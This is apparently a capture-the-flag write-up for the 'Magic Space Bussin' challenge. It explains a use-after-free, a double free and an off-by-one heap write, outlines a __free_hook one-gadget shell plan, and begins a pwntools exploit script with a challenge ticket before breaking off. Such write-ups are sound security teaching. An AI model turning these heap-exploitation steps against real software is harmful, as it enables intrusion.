</span></span></code></pre></div><h2 class="relative group">Magic Space Bussin<div id=magic-space-bussin class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#magic-space-bussin aria-label=Anchor>#</a></span></h2><h3 class="relative group">The challenge<div id=the-challenge-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-4 aria-label=Anchor>#</a></span></h3><p><strong>Category</strong>: &ldquo;Pure Pwnage&rdquo;</p><h4 class="relative group">Description<div id=description-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description-4 aria-label=Anchor>#</a></span></h4><p>The challenge is a C++ application for which we are given both the compiled binary (called <code>magic</code>) and the source code. It can be run using the provided challenge files, which include a couple of <code>Dockerfile</code> files and a top level <code>Makefile</code>:</p><p>Building a local copy:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ make static
</span></span></code></pre></div><p>Running the challenge:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ make build     <span class=c1># Build Docker containers</span>
</span></span><span class=line><span class=cl>$ make challenge <span class=c1># Run challenge locally through socat + Docker</span>
</span></span></code></pre></div><p>When the <code>magic</code> binary is started we are greeted with a menu:</p><pre tabindex=0><code>startracker 1 pipe_id: 0
startracker 2 pipe_id: 1
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
&gt;
</code></pre><p>Option <code>1</code> allows us to send messages on a pipe:</p><pre tabindex=0><code>startracker 1 pipe_id: 0
startracker 2 pipe_id: 1
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
&gt; 1

msg_id: 100
pipe_id: 0
hex: 0
Message to post on bus: AAAAAAAA
Clearing msg (0 : 100)
</code></pre><p>When sending messages we are asked for 4 parameters:</p><ul><li><code>msg_id</code>: Identifies the function that will get executed when the message is read from the pipe, the only valid value is <code>100</code></li><li><code>pipe_id</code>: Identifies the pipe on which the message will be sent, valid values are <code>0</code>, <code>1</code> and <code>255</code> (broadcast)</li><li><code>hex</code>: A boolean value that indicated whether the message content is hex-encoded or not</li><li><code>Message to post on bus</code>: The message content</li></ul><p>Option <code>2</code> and <code>3</code> allow us to pop messages that were sent respectively in pipe <code>0</code> and <code>1</code>.</p><p>The only valid <code>msg_id</code> is 100, and when such a message is received on a pipe the program simply prints the hex-encoded message byte by byte. For example:</p><pre tabindex=0><code>startracker 1 pipe_id: 0
startracker 2 pipe_id: 1
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
&gt; 1

msg_id: 100
pipe_id: 0
hex: 0
Message to post on bus: AAAAAAAA
Clearing msg (0 : 100)
1: Post message on bus
2: Handle startracker 1 messages
3: Handle startracker 2 messages
4: Exit
&gt; 2

StarTracker: Testing Message
0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
Clearing msg (0 : 100)
</code></pre><h3 class="relative group">Solution<div id=solution-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-4 aria-label=Anchor>#</a></span></h3><p>There are two vulnerabilities in the challenge, the first one is a use-after-free (UAF) plus a double free, and the second one is an off-by-one out-of-bounds write.</p><h4 class="relative group">UAF + double free<div id=uaf--double-free class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#uaf--double-free aria-label=Anchor>#</a></span></h4><p>Each pipe has a maximum message capacity of <code>10</code>, which means that after <code>10</code> messages you will no longer be able to send messages on that pipe unless you pop some of them by using option <code>2</code> or <code>3</code>.</p><p>When sending a message to <code>pipe_id = 255</code> the message is broadcasted to both pipe <code>0</code> and <code>1</code>.
The UAF occurs when we broadcast a message with the pipe <code>0</code> full.
After failing to send the message to pipe <code>0</code> (at <code>[5]</code> with <code>i = 0</code>) the program frees the pointer containing the message data and then keeps broadcasting the freed message to pipe <code>1</code>. Which means that when the message is sent to pipe 1 (at <code>[4]</code> with <code>i = 1</code>) the pipe will store a freed pointer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// pipe_id 255 -&gt; broadcast
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>payload</span><span class=o>-&gt;</span><span class=n>pipe_id</span> <span class=o>==</span> <span class=n>UINT8_MAX</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// [1]
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// bail out if too many pipes are subscribed to a msg_id
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>msg_id_pipe_lens</span><span class=p>[</span><span class=n>payload</span><span class=o>-&gt;</span><span class=n>msg_id</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>this</span><span class=o>-&gt;</span><span class=n>msg_max_subs</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>copy</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// [2]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// for each pipe subscribed to this msg_id
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// (pipe 0 and 1 are subscribed to the only available msg_id -&gt; 100)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>this</span><span class=o>-&gt;</span><span class=n>msg_id_pipe_lens</span><span class=p>[</span><span class=n>payload</span><span class=o>-&gt;</span><span class=n>msg_id</span><span class=p>];</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=n>cur_pipe_num</span> <span class=o>=</span> <span class=n>this</span><span class=o>-&gt;</span><span class=n>msg_id_pipe_map</span><span class=p>[</span><span class=n>payload</span><span class=o>-&gt;</span><span class=n>msg_id</span><span class=p>][</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// [3]
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// the last pipe stores the pointer used to read the message content
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// other pipes always receive a new copy of that buffer
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>==</span> <span class=p>(</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>msg_id_pipe_lens</span><span class=p>[</span><span class=n>payload</span><span class=o>-&gt;</span><span class=n>msg_id</span><span class=p>]</span><span class=o>-</span><span class=mi>1</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=n>copy</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>pipe</span> <span class=o>=</span> <span class=nf>GetPipeByNum</span><span class=p>(</span><span class=n>cur_pipe_num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// [4]
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// if copy is false then the pipe will store
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// payload-&gt;data without copying it
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=o>-&gt;</span><span class=nf>SendMsgToPipe</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>copy</span><span class=p>)</span> <span class=o>!=</span> <span class=n>SB_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>LOG_ERR</span><span class=p>(</span><span class=s>&#34;Unable to send payload to Pipe Num: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>cur_pipe_num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1>// [5]
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=c1>// when sending a message on a full pipe `SendMsgToPipe` will fail
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=c1>// and payload-&gt;data will be freed
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=n>delete</span> <span class=n>payload</span><span class=o>-&gt;</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>ret</span> <span class=o>=</span> <span class=n>SB_FAIL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>LOG_ERR</span><span class=p>(</span><span class=s>&#34;No pipes subscribed to Msg ID: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=o>-&gt;</span><span class=n>msg_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>delete</span> <span class=n>payload</span><span class=o>-&gt;</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=n>SB_FAIL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span><span class=o>-&gt;</span><span class=n>data</span> <span class=o>=</span> <span class=n>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>LOG_ERR</span><span class=p>(</span><span class=s>&#34;Too many pipes subscribed to Msg ID: %d. Bailing out...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=o>-&gt;</span><span class=n>msg_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>When receiving a message from a pipe the data pointer is freed, which means that if, after triggering this UAF, we receive the first message from the pipe <code>1</code>, we will trigger a double free.</p><h4 class="relative group">Off-by-one<div id=off-by-one class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#off-by-one aria-label=Anchor>#</a></span></h4><p>The off-by-one write occurs when sending an hex-encoded message with an odd length:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>size_t</span> <span class=n>SB_Pipe</span><span class=o>::</span><span class=nf>CalcPayloadLen</span><span class=p>(</span><span class=kt>bool</span> <span class=n>ishex</span><span class=p>,</span> <span class=k>const</span> <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>&amp;</span> <span class=n>s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ishex</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s</span><span class=p>.</span><span class=nf>length</span><span class=p>()</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>s</span><span class=p>.</span><span class=nf>length</span><span class=p>()</span> <span class=o>/</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>s</span><span class=p>.</span><span class=nf>length</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span><span class=o>*</span> <span class=n>SB_Pipe</span><span class=o>::</span><span class=nf>AllocatePlBuff</span><span class=p>(</span><span class=kt>bool</span> <span class=n>ishex</span><span class=p>,</span> <span class=k>const</span> <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>&amp;</span> <span class=n>s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ishex</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>new</span> <span class=kt>uint8_t</span><span class=p>[</span><span class=n>s</span><span class=p>.</span><span class=nf>length</span><span class=p>()</span> <span class=o>/</span> <span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>new</span> <span class=kt>uint8_t</span><span class=p>[</span><span class=n>s</span><span class=p>.</span><span class=nf>length</span><span class=p>()];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// invoked when sending a message on a pipe
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>SB_Msg</span><span class=o>*</span> <span class=n>SB_Pipe</span><span class=o>::</span><span class=nf>ParsePayload</span><span class=p>(</span><span class=k>const</span> <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>&amp;</span> <span class=n>s</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>ishex</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>pipe_id</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=n>msg_id</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>s</span><span class=p>.</span><span class=nf>length</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// allocate a buf on the heap of sz = s.length() / 2
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>msg_s</span> <span class=o>=</span> <span class=nf>AllocatePlBuff</span><span class=p>(</span><span class=n>ishex</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// if user sent `hex: 1`
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>ishex</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>cur_byte</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// if s.lenth() is odd `CalcPayloadLen()` returns s.length()
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// instead of s.length() / 2
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nf>CalcPayloadLen</span><span class=p>(</span><span class=n>ishex</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span> <span class=n>i</span><span class=o>+=</span><span class=mi>2</span><span class=p>,</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>cur_byte</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>cur_byte</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=n>msg_s</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>static_cast</span><span class=o>&lt;</span><span class=kt>uint8_t</span><span class=o>&gt;</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=nf>strtol</span><span class=p>(</span><span class=n>cur_byte</span><span class=p>,</span> <span class=n>nullptr</span><span class=p>,</span> <span class=mi>16</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nf>CalcPayloadLen</span><span class=p>(</span><span class=n>ishex</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=n>msg_s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>static_cast</span><span class=o>&lt;</span><span class=kt>uint8_t</span><span class=o>&gt;</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>We can only control the lower nibble of byte written oob, the higher nibble is always set to <code>0</code> because <code>strtoul()</code> only sees a 1-character string.</p><h4 class="relative group">Exploitation<div id=exploitation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploitation aria-label=Anchor>#</a></span></h4><p>In short, we used the UAF to get a libc leak from a freed unsorted bin, and the double free in combination with the off-by-one oob write to get arbitrary write and overwrite <code>__free_hook</code> with a <a href=https://github.com/david942j/one_gadget target=_blank>one gadget</a> that calls <code>execve("/bin/sh", 0, 0)</code>. The complete exploit script is provided below and explains the relevant exploitation steps in more detail through comments in the <code>main()</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./magic_patched&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc_debug-2.31.so&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TICKET</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;ticket{quebec703978whiskey4:GEmu1G0NX1z6syFsVFKuX0vLGEw0ULBraF16mEtKzS4qEdVXUd8NgwhCMM9Y4bpAjg}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;magic.quals2023-kah5Aiv9.satellitesabove.me&#39;</span><span class=p>,</span> <span class=mi>5300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Ticket please:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>TICKET</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>post_msg</span><span class=p>(</span><span class=n>msg_id</span><span class=p>,</span> <span class=n>pipe_id</span><span class=p>,</span> <span class=n>ishex</span><span class=p>,</span> <span class=n>msg</span><span class=p>,</span> <span class=n>pwn</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;msg_id: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>msg_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;pipe_id: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>pipe_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;hex: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>ishex</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Message to post on bus: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pwn</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;(.)*Clearing msg \((\d+) : (\d+)\)&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>m</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>2</span><span class=p>)),</span> <span class=nb>int</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>3</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle</span><span class=p>(</span><span class=n>startracker_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>startracker_id</span> <span class=o>!=</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>startracker_id</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=s1>&#39;Invalid startracker_id: </span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>startracker_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>startracker_id</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>startracker_id</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>STOP</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>1: Post message on bus&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>STOP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[:</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>STOP</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;Testing Message</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
